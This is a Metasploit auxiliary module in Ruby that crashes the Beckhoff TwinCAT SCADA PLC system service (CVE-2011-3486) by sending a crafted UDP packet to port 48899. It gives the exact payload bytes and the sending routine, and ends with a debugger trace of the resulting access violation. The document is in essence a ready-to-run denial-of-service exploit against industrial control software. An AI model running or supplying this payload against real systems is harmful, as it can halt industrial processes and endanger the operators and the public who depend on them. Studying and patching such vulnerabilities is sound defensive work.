##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Beckhoff TwinCAT SCADA PLC 2.11.0.2004 DoS',
      'Description'    => %q{
        The Beckhoff TwinCAT version <= 2.11.0.2004 can be brought down by sending
        a crafted UDP packet to port 48899 (TCATSysSrv.exe).
      },
      'Author'         =>
        [
          'Luigi Auriemma', # Public exploit
          'jfa',            # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-3486' ],
          [ 'OSVDB', '75495' ],
          [ 'URL', 'http://aluigi.altervista.org/adv/twincat_1-adv.txt' ]
        ],
      'DisclosureDate' => 'Sep 13 2011'
    ))

    register_options([Opt::RPORT(48899)])
  end

  def run
    dos = "\x03\x66\x14\x71" + "\x00"*16 + "\xff"*1514
    connect_udp
    print_status("Sending DoS packet ...")
    udp_sock.put(dos)
    disconnect_udp
  end
end

=begin
0:017> g
(4d4.850): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=02a1f9cf ebx=0037c0a8 ecx=02a0f9cc edx=ffffffff esi=02a0f9b4 edi=00000001
eip=00414f6a esp=02a0f7bc ebp=0000ffff iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
*** ERROR: Module load completed but symbols could not be loaded for C:\TwinCAT\TCATSysSrv.exe
TCATSysSrv+0x14f6a:
00414f6a 66833802        cmp     word ptr [eax],2         ds:0023:02a1f9cf=????
0:016> k
ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be wrong.
02a0f7f8 71ab265b TCATSysSrv+0x14f6a
02a0f80c 71ab4a9e WS2_32!Prolog_v1+0x21
02a0f834 7c90df3c WS2_32!WPUQueryBlockingCallback+0x1b
02a0f880 71a5332f ntdll!NtWaitForSingleObject+0xc
02a0f8f4 71abf6e7 mswsock!WSPRecvFrom+0x35c
02a0f938 71ad303a WS2_32!WSARecvFrom+0x7d
02a0f96c 00414b92 WSOCK32!recvfrom+0x39
02a0f988 00000000 TCATSysSrv+0x14b92
=end
